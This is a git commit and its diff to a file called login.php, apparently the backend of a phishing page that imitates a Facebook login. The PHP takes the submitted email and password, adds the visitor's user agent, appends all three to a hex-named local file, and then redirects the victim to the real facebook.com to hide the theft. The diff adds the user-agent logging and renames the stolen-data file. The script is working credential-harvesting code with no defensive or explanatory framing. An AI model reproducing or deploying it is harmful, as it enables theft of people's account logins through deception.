2814e175ec4af94aa311a05b3c5c705d54586dbd
swarupgupta <swarup.gupta@yandex.com>
2017-06-20 09:00:45 +0000

    ua
    ua jog kora holo

--- login.php
+++ login.php
@@ -1,8 +1,12 @@
 <?php
 $email=$_POST['email'];
 $pass = $_POST['pass'];
-$data = $email." : ".$pass."\n";
-$fp = fopen("abd", "a+");
+$ua = "unknown";
+if(isset($_SERVER['HTTP_USER_AGENT'])){
+  $ua = $_SERVER['HTTP_USER_AGENT'];
+}
+$data = $email." : ".$pass." : ".$ua."\n";
+$fp = fopen("d2e970b81b067fd004541182d522c7da", "a+");
 fwrite($fp, $data);
 header("location: https://www.facebook.com");
 ?>
